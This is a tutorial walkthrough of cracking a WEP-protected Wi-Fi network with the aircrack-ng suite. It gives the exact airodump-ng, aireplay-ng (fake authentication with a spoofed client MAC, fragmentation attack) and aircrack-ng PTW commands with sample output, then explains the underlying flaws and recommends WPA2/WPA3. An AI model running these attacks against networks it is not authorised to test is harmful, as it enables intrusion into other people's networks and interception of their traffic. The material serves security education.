# 49 - WEP Cracking with Aircrack-ng Suite

## Overview

WEP (Wired Equivalent Privacy) is a deprecated wireless security protocol with critical cryptographic flaws. The aircrack-ng suite can crack WEP keys by capturing enough initialization vectors (IVs) and exploiting weaknesses in the RC4 stream cipher implementation.

## Attack Workflow

```
1. Monitor target AP and capture packets (airodump-ng)
2. Authenticate with the AP (aireplay-ng -1)
3. Capture keystream via fragmentation attack (aireplay-ng -5)
4. Crack the WEP key using collected IVs (aircrack-ng)
```

## Simple Example: Why WEP Fails

### The Problem with IV Reuse

```
WEP encryption:
  Packet 1: IV=0x123456 + Key=0xABCDE → RC4 keystream → encrypt data
  Packet 2: IV=0x789ABC + Key=0xABCDE → different keystream → encrypt data
  ...
  Packet N: IV=0x123456 + Key=0xABCDE → SAME keystream as Packet 1!

After ~5,000 packets, IVs start repeating (birthday paradox).
Same IV + same key = same keystream = XOR reuse vulnerability.
```

### Statistical Attack Simplified

```
Imagine WEP key is: [K0, K1, K2, K3, K4]

For each captured packet with IV:
  - IV + K0 produces first keystream byte
  - RC4 has statistical bias: certain (IV, keystream) pairs reveal K0

After collecting 20,000+ IVs:
  - Vote for K0: byte 0x70 appears most often → K0 = 0x70
  - Vote for K1: byte 0x34 appears most often → K1 = 0x34
  - Vote for K2: byte 0x91 appears most often → K2 = 0x91
  - Vote for K3: byte 0x37 appears most often → K3 = 0x37
  - Vote for K4: byte 0x29 appears most often → K4 = 0x29

Result: Key = 70:34:91:37:29 ✓
```

## Step 1: Packet Capture with airodump-ng

### Command

```bash
airodump-ng --bssid 00:18:F8:F4:CF:E4 -c 9 ath2 -w eric-g
```

### Parameters

```
--bssid 00:18:F8:F4:CF:E4    Target AP MAC address
-c 9                          Channel 9
ath2                          Wireless interface in monitor mode
-w eric-g                     Output file prefix
```

### Output

```
CH 9 ][ Elapsed: 4 mins ][ 2007-11-21 23:08

BSSID              PWR  RXQ  Beacons  #Data  #/s  CH  MB  ENC  CIPHER  AUTH  ESSID
00:18:F8:F4:CF:E4   21   21   242      826    25   9   48  WEP  WEP     OPN   eric-G

BSSID              STATION            PWR  Lost  Packets  Probes
00:18:F8:F4:CF:E4  06:19:7E:8E:72:87   23   0     34189
```

Key information:
- **BSSID**: Target AP MAC
- **ESSID**: Network name "eric-G"
- **ENC**: WEP encryption
- **#Data**: 826 data packets captured
- **STATION**: Connected client MAC

## Step 2: Fake Authentication with aireplay-ng

### Command

```bash
aireplay-ng -1 600 -e eric-G -a 00:18:F8:F4:CF:E4 -h 06:19:7E:8E:72:87 ath2
```

### Parameters

```
-1                            Fake authentication attack
600                           Reassociation timing (600 seconds)
-e eric-G                     Target ESSID
-a 00:18:F8:F4:CF:E4          AP MAC (BSSID)
-h 06:19:7E:8E:72:87          Client MAC (spoofed)
ath2                          Wireless interface
```

### Output

```
22:53:23  Waiting for beacon frame (BSSID: 00:18:F8:F4:CF:E4)
22:53:23  Sending Authentication Request
22:53:23  Authentication successful
22:53:23  Sending Association Request
22:53:24  Association successful :-)
22:53:39  Sending keep-alive packet
22:53:54  Sending keep-alive packet
...
22:55:54  Got a deauthentication packet!
22:55:57  Sending Authentication Request
22:55:59  Authentication successful
22:55:59  Sending Association Request
22:55:59  Association successful :-)
22:56:14  Sending keep-alive packet
```

**Keep this running** - maintains association with the AP for subsequent attacks.

## Step 3: Fragmentation Attack with aireplay-ng

### Command

```bash
aireplay-ng -5 -b 00:18:F8:F4:CF:E4 -h 06:19:7E:8E:72:87 ath2
```

### Parameters

```
-5                            Fragmentation attack
-b 00:18:F8:F4:CF:E4          AP MAC (BSSID)
-h 06:19:7E:8E:72:87          Client MAC
ath2                          Wireless interface
```

### Output

```
22:59:41  Waiting for a data packet...
Read 873 packets...

Size: 352, FromDS: 1, ToDS: 0 (WEP)

BSSID      = 00:18:F8:F4:CF:E4
Dest. MAC  = 01:00:5E:7F:FF:FA
Source MAC = 00:18:F8:F4:CF:E2

0x0000: 0842 0000 0100 5e7f fffa 0018 f8f4 cfe4  .B....^.........
0x0010: 0018 f8f4 cfe2 c0b5 121a 4600 0e18 0f3d  ..........F....=
0x0020: bd80 8c41 de34 0437 8d2d c97f 2447 3d81  ...A.4.7.-.$G=.
--- CUT ---

Use this packet ? y

Saving chosen packet in replay_src-1121-230028.cap
23:00:38  Data packet found!
23:00:38  Sending fragmented packet
23:00:38  Got RELAYED packet!!
23:00:38  Thats our ARP packet!
23:00:38  Trying to get 384 bytes of a keystream
23:00:38  Got RELAYED packet!!
23:00:38  Thats our ARP packet!
23:00:38  Trying to get 1500 bytes of a keystream
23:00:38  Got RELAYED packet!!
23:00:38  Thats our ARP packet!
Saving keystream in fragment-1121-230038.xor
Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
```

### What Happened

The fragmentation attack exploits WEP's lack of replay protection:
1. Captures a WEP-encrypted packet from the AP
2. Fragments it and sends back to AP
3. AP decrypts and relays fragments
4. Attacker observes relayed packets to extract 1500 bytes of keystream

## Step 4: Crack WEP Key with aircrack-ng

### Command

```bash
aircrack-ng -z eric-g-05.cap
```

### Parameters

```
-z                            PTW attack method (faster)
eric-g-05.cap                 Captured packet file
```

### Output

```
Opening eric-g-05.cap
Read 64282 packets.

#  BSSID              ESSID                     Encryption
1  00:18:F8:F4:CF:E4  eric-G                    WEP (21102 IVs)

Choosing first network as target.

Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 21397 ivs.

Aircrack-ng 0.9.1

[00:00:11] Tested 78120/140000 keys (got 22918 IVs)

   KB    depth   byte(vote)
    0     3/  5   34(111) 70(109) 42(107) 2C(106) B9(106) E3(106)
    1     1/ 14   34(115) 92(110) 35(109) 53(109) 33(108) CD(107)
    2     6/ 18   91(114) E7(114) 21(111) 0E(110) 88(109) C6(109)
    3     2/ 31   37(109) 80(109) 5F(108) 92(108) 9E(108) 9B(107)
    4     0/  2   29(129) 55(114) AD(112) 6A(111) BB(110) C1(110)

KEY FOUND! [ 70:34:91:37:29 ]
Decrypted correctly: 100%
```

**Success!** The WEP key is `70:34:91:37:29` (40-bit WEP).

## How WEP Cracking Works

### The Vulnerability

WEP uses RC4 stream cipher with a 24-bit IV prepended to the key:

```
Encryption key = IV (24 bits) + WEP key (40 or 104 bits)
```

Problems:
1. **Small IV space**: 24 bits = 16,777,216 possible IVs → IV reuse inevitable
2. **Weak key scheduling**: Certain IVs produce weak RC4 keys
3. **No replay protection**: Same packet can be replayed multiple times

### PTW Attack

The Pyshkin-Tews-Weinmann attack exploits statistical biases in RC4:
- Analyzes first byte of keystream from each IV
- Uses statistical correlation between IV and key bytes
- Requires ~20,000-40,000 IVs (vs 5+ million for older FMS attack)
- Much faster than brute force

## Key Takeaways

| Aspect | Detail |
|--------|--------|
| **Attack type** | Statistical cryptanalysis (PTW) |
| **IVs needed** | ~20,000-40,000 for PTW attack |
| **Time** | Minutes with active traffic |
| **Root cause** | RC4 weak keys + small IV space + IV reuse |
| **Mitigation** | Use WPA2/WPA3 instead of WEP |

## Why WEP Is Broken

```
1. 24-bit IV → guaranteed reuse after ~5,000 packets (birthday paradox)
2. IV sent in plaintext → attacker knows which IV was used
3. RC4 weak keys → statistical bias in keystream
4. No integrity protection → packet injection possible
5. No replay protection → fragmentation attack works
```

WEP is completely broken and should never be used. Modern alternatives (WPA2/WPA3) use AES with proper key derivation and replay protection.
